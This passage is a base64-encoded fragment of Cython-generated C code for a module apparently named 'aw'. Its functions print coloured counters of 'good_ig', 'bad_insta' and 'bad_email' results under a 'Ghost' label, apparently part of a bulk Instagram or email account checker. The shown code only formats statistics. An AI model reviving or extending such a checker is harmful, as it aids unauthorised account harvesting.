pZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxMDksIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogIF9fcHl4X3ZfU2V4eSA9IF9fcHl4X3RfMTsKICBfX3B5eF90XzEgPSAwOwoKICAKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JhZF9pbnN0YSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDExMCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9iYWRfZW1haWwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAxMTAsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIF9fcHl4X3RfMyA9IFB5TnVtYmVyX0FkZChfX3B5eF90XzEsIF9fcHl4X3RfMik7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDExMCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgX19weXhfdl9TZXggPSBfX3B5eF90XzM7CiAgX19weXhfdF8zID0gMDsKCiAgCiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nb29kX2lnKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMTExLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBfX3B5eF92X1h4eCA9IF9fcHl4X3RfMzsKICBfX3B5eF90XzMgPSAwOwoKICAKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0ZvcmUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR1JFRU4pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogIF9fcHl4X3RfMiA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF92X1NleHksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfRm9yZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDExMywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9SRUQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF92X1NleCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDExMywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9Gb3JlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTEzLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dSRUVOKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTEzLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTEzLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICBfX3B5eF90XzYgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdl9YeHgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxMTMsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfRm9yZSk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDExMywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9DWUFOKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMTEzLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF84LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMTEzLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1N0eWxlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMTEzLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICBfX3B5eF90XzkgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1JFU0VUX0FMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDExMywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDExMywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CiAgX19weXhfdF8xMFswXSA9IF9fcHl4X3RfMzsKICBfX3B5eF90XzEwWzFdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMjsKICBfX3B5eF90XzEwWzJdID0gX19weXhfdF8yOwogIF9fcHl4X3RfMTBbM10gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18zOwogIF9fcHl4X3RfMTBbNF0gPSBfX3B5eF90XzE7CiAgX19weXhfdF8xMFs1XSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzQ7CiAgX19weXhfdF8xMFs2XSA9IF9fcHl4X3RfNDsKICBfX3B5eF90XzEwWzddID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMzsKICBfX3B5eF90XzEwWzhdID0gX19weXhfdF81OwogIF9fcHl4X3RfMTBbOV0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X181OwogIF9fcHl4X3RfMTBbMTBdID0gX19weXhfdF82OwogIF9fcHl4X3RfMTBbMTFdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fNjsKICBfX3B5eF90XzEwWzEyXSA9IF9fcHl4X3RfNzsKICBfX3B5eF90XzEwWzEzXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfR0hPU1RfUkZYOwogIF9fcHl4X3RfMTBbMTRdID0gX19weXhfdF84OwogIF9fcHl4X3RfOSA9IF9fUHl4X1B5VW5pY29kZV9Kb2luKF9fcHl4X3RfMTAsIDE1LCBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzMpICsgOCArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMikgKyA0ICogMiArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMSkgKyA3ICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF80KSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNSkgKyAxMiArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNikgKyA1ICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF83KSArIDI2ICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF84KSwgMTExNDExMSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzMpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfMikgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xKSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzQpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfNSkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF82KSB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzcpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfOCkpOwogIGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDExMywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgX19weXhfdl9zdGF0c19saW5lID0gKChQeU9iamVjdCopX19weXhfdF85KTsKICBfX3B5eF90XzkgPSAwOwoKICAKICBfX3B5eF90XzggPSBOVUxMOwogIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX3ByaW50KTsKICBfX3B5eF90XzcgPSBfX3B5eF9idWlsdGluX3ByaW50OyAKICBfX3B5eF90XzYgPSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzcsIF9fcHl4X3Zfc3RhdHNfbGluZSk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDExNCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgX19weXhfdF8xMSA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzIgKyAoKENZVEhPTl9WRUNUT1JDQUxMKSA/IDIgOiAwKV0gPSB7X19weXhfdF84LCBfX3B5eF90XzZ9OwogICAgX19weXhfdF81ID0gX19QeXhfTWFrZVZlY3RvcmNhbGxCdWlsZGVyS3dkcygyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTE0LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZW5kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XywgX19weXhfdF81LCBfX3B5eF9jYWxsYXJncysyLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDExNCwgX19weXhfTDFfZXJyb3IpCiAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9mbHVzaCwgUHlfVHJ1ZSwgX19weXhfdF81LCBfX3B5eF9jYWxsYXJncysyLCAxKSA8ICgwKSkgX19QWVhfRVJSKDAsIDExNCwgX19weXhfTDFfZXJyb3IpCiAgICBfX3B5eF90XzkgPSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIoX19weXhfdF83LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzExLCAoMi1fX3B5eF90XzExKSB8IChfX3B5eF90XzExKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfNSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfOSkpIF9fUFlYX0VSUigwLCAxMTQsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwOwoKICAKCiAgCiAgX19weXhfciA9IFB5X05vbmU7IF9fUHl4X0lOQ1JFRihQeV9Ob25lKTsKICBnb3RvIF9fcHl4X0wwOwogIF9fcHl4X0wxX2Vycm9yOjsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsKICBfX1B5eF9BZGRUcmFjZWJhY2soImF3LnBwcHAiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICBfX3B5eF9yID0gTlVMTDsKICBfX3B5eF9MMDo7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X1NleHkpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9TZXgpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9YeHgpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9zdGF0c19saW5lKTsKICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKCgoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18yYXdfNXVwZGF0ZV9zdGF0cyhQeU9iamVjdCAqX19weXhfc2VsZiwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqdW51c2VkKTsgCnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZGVmXzJhd181dXBkYXRlX3N0YXRzID0geyJ1cGRhdGVfc3RhdHMiLCAoUHlDRnVuY3Rpb24pX19weXhfcHdfMmF3XzV1cGRhdGVfc3RhdHMsIE1FVEhfTk9BUkdTLCAwfTsKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18yYXdfNXVwZGF0ZV9zdGF0cyhQeU9iamVjdCAqX19weXhfc2VsZiwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqdW51c2VkKSB7CiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqY29uc3QgKl9fcHl4X2t3dmFsdWVzOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gMDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJ1cGRhdGVfc3RhdHMgKHdyYXBwZXIpIiwgMCk7CiAgX19weXhfa3d2YWx1ZXMgPSBfX1B5eF9Ld1ZhbHVlc19WQVJBUkdTKF9fcHl4X2FyZ3MsIF9fcHl4X25hcmdzKTsKICBfX3B5eF9yID0gX19weXhfcGZfMmF3XzR1cGRhdGVfc3RhdHMoX19weXhfc2VsZik7CgogIAogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJhd180dXBkYXRlX3N0YXRzKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3NlbGYpIHsKICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8yID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8zID0gTlVMTDsKICBzaXplX3QgX19weXhfdF80OwogIGludCBfX3B5eF9saW5lbm8gPSAwOwogIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDsKICBpbnQgX19weXhfY2xpbmVubyA9IDA7CiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoInVwZGF0ZV9zdGF0cyIsIDApOwoKICAKICBfX3B5eF90XzIgPSBOVUxMOwogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcHBwcCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDExOCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgX19weXhfdF80ID0gMTsKICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMykpKSB7CiAgICBfX3B5eF90XzIgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzMpOwogICAgYXNzZXJ0KF9fcHl4X3RfMik7CiAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMyk7CiAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8yKTsKICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzMsIF9fcHl4X19mdW5jdGlvbik7CiAgICBfX3B5eF90XzQgPSAwOwogIH0KICAjZW5kaWYKICB7CiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yLCBOVUxMfTsKICAgIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMywgX19weXhfY2FsbGFyZ3MrX19weXhfdF80LCAoMS1fX3B5eF90XzQpIHwgKF9fcHl4X3RfNCpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMTE4LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogIH0KICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKCiAgCgogIAogIF9fcHl4X3IgPSBQeV9Ob25lOyBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7CiAgZ290byBfX3B5eF9MMDsKICBfX3B5eF9MMV9lcnJvcjo7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7CiAgX19QeXhfQWRkVHJhY2ViYWNrKCJhdy51cGRhdGVfc3RhdHMiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICBfX3B5eF9yID0gTlVMTDsKICBfX3B5eF9MMDo7CiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0KCgoKCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMmF3XzdHaG9zdChQeU9iamVjdCAqX19weXhfc2VsZiwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqdW51c2VkKTsgCnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZGVmXzJhd183R2hvc3QgPSB7Ikdob3N0IiwgKFB5Q0Z1bmN0aW9uKV9fcHl4X3B3XzJhd183R2hvc3QsIE1FVEhfTk9BUkdTLCAwfTsKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18yYXdfN0dob3N0KFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICp1bnVzZWQpIHsKICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSAwOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIkdob3N0ICh3cmFwcGVyKSIsIDApOwogIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfVkFSQVJHUyhfX3B5eF9hcmdzLCBfX3B5eF9uYXJncyk7CiAgX19weXhfciA9IF9fcHl4X3BmXzJhd182R2hvc3QoX19weXhfc2VsZik7CgogIAogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CnN0YXRpYyBQeU9iamVjdCAqX19weXhfZ2JfMmF3XzVHaG9zdF8yZ2VuZXJhdG9yKF9fcHl4X0Nvcm91dGluZU9iamVjdCAqX19weXhfZ2VuZXJhdG9yLCBDWVRIT05fVU5VU0VEIFB5VGhyZWFkU3RhdGUgKl9fcHl4X3RzdGF0ZSwgUHlPYmplY3QgKl9fcHl4X3NlbnRfdmFsdWUpOyAKCgoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8yYXdfNUdob3N0X2dlbmV4cHIoUHlPYmplY3QgKl9fcHl4X3NlbGYsIFB5T2JqZWN0ICpfX3B5eF9nZW5leHByX2FyZ18wKSB7CiAgc3RydWN0IF9fcHl4X29ial8yYXdfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwciAqX19weXhfY3VyX3Njb3BlOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIGludCBfX3B5eF9saW5lbm8gPSAwOwogIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDsKICBpbnQgX19weXhfY2xpbmVubyA9IDA7CiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImdlbmV4cHIiLCAwKTsKICBfX3B5e